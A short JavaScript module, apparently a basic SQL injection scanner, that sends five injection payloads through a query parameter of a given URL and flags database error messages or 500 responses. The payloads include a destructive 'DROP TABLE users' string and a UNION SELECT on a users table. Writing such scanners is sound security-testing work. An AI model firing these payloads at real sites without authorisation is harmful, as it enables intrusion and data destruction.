import axios from 'axios';

async function check(url) {
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin' --",
    "1' OR '1' = '1",
  ];

  const vulnerableParams = [];

  for (const payload of payloads) {
    try {
      const testUrl = `${url}${
        url.includes('?') ? '&' : '?'
      }test=${encodeURIComponent(payload)}`;
      const response = await axios.get(testUrl, {
        timeout: 5000,
        validateStatus: (status) => status < 500,
      });

      // Check for SQL error patterns in response
      const content = response.data.toLowerCase();
      const sqlErrors = [
        'sql syntax',
        'mysql error',
        'postgresql error',
        'sqlite error',
        'ora-',
        'microsoft sql server',
        'syntax error',
      ];

      const hasSqlError = sqlErrors.some((error) => content.includes(error));

      if (hasSqlError) {
        vulnerableParams.push({
          payload,
          url: testUrl,
          error: 'SQL error detected',
        });
      }
    } catch (error) {
      // If error, might indicate vulnerability
      if (error.response?.status === 500) {
        vulnerableParams.push({
          payload,
          url: `${url}${url.includes('?') ? '&' : '?'}test=${encodeURIComponent(
            payload
          )}`,
          error: '500 Internal Server Error',
        });
      }
    }
  }

  return {
    vulnerable: vulnerableParams.length > 0,
    findings: vulnerableParams,
    testedPayloads: payloads.length,
  };
}

export { check };
